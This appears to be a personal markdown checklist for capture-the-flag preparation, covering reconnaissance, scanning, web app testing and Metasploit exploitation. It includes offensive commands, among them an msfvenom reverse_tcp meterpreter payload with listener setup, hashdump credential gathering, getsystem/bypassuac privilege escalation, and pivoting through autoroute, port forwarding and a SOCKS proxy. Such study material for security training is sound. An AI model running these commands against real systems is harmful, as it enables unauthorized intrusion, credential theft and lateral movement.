# Prep for CTFs

## Enumeration
### OSINT
- [ ] Social Media
- [ ] CrunchBase
- [ ] SAM - System for Award Managment

### Reccy
#### Subdomain Enumeration
- [ ] whois
- [ ] nslookup
- [ ] dnsdumpster
- [ ] Sublist3r
- [ ] crt.sh
- [ ] amass
<details>
<summary> amass install  </summary>
	<pre>$ sudo apt install snapd </pre>
	<pre>$ service snapd start </pre>
	<pre>$ snap install amass </pre>
	<pre>$ snap run amass </pre>
</details>

### In-Depth Scanning
- [ ] ping / pingsweep / masscan
- [ ] Verify UDP / TCP
- [ ] Verify FWs
- [ ] OS Type
<details>
<summary>Common nmap options </summary>
	<words> Firewalls 
	<pre>$ nmap -Pn </pre>
	</words>
</details>

## Web App
- [ ] Banner - http/s
<details>
<summary> Grabbing Banners </summary>
	<pre>$ nc <target> <port> </pre>
	<pre>$ <verb> / /http/1.0 </pre>
	<br>
	<words>When dealing with https</words>
	<pre>$ openssl s_client -connect target.top-level domain:port </pre>
	<pre>$  <verb> / http/1.0 </pre>
</details>

- [ ] httprint (signature based)
<details>
<summary> Using httprint </summary>
	<pre>$ httprint -P0 -h <target hosts> -s <signature file> -> automatic fingerprinting </pre>
</details>

- [ ] OPTIONS
- [ ] Check for uploads
- [ ] Proxy the site(s)  (BurpSuite, ZAP)
- [ ] Dirb, gobuster, feroxbuster, etc
- [ ] XSS (Expand)
- [ ] Types of XSS
- [ ] SQL (Expand)
<details>
<summary> SQL Good Stuff </summary>
	<words> Basic MySQL </words>
	<pre>$ mysql -h ip -u root -ppassword (-p[nospace]password) </pre>
		
</details>

## System Exploitation
### Vulnerability Scanning
- [ ] OpenVAS, Nessus, nmap, GFI Lan Guard

### System PrivEsc
- [ ] Linenum.sh
- [ ] Unshadow
- [ ] Hydra
- [ ] Windows Shares
- [ ] msfconsole
<details>
<summary> Common Metasploit Tools </summary>
	<words> Background Sessions </words>
	<pre>$ background (while in meterpreter) </pre>
	<pre>$ sessions -i </pre>
	<pre>$ sessions -i # (session #) </pre>
	<words> Common Commands </words>
	<pre>$ sysinfo, ipconfig, route, getuid </pre>
	<words> Common Utilities </words>
	<pre>$ download x, upload x, use post/windows/gather/hashdump </pre>
	<words> Automated PrivEsc </words>
	<pre>$ getsystem </pre>
	<words> OR </words>
	<pre>$ bypassuac </pre>
	<words> Common Meterpreter Payloads with msfvenom </words>
	<pre>$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ip LPORT=port -f elf > payload.bin</pre>
	<words> Listener </words>
	<pre>$ use exploit/multi/handler </pre>
	<pre>$ set payload linux/x64/meterpreter/reverse_tcp </pre>
	<pre>$ set LHOST ip </pre>
	<pre>$ set LPORT port </pre>	
</details>

### Pivoting
- [ ] Route
- [ ] Metasploit autoroute
<details>
<summary> Metasploit Pivoting </summary>
	<words> Background Sessions </words>
	<pre>$ run autoroute -s ip/subnet </pre>
	<pre>$ run autoroute -p (shows routes)</pre>
	<words> Port Forwarding </words>
	<pre>$ portfwd add -l 9999 -p 20 -r ip </pre>
	<pre>$ portfwd list </pre>
	<br>
	<words> Using Metasploit as a SOCKS Proxy </words>
	<pre>$ use auxiliary/server/socks_proxy </pre>
	<pre>$ set VERSION 4a </pre>
	<pre>$ set SRVPORT 9050</pre>
	<pre>$ run -j </pre>
</details>

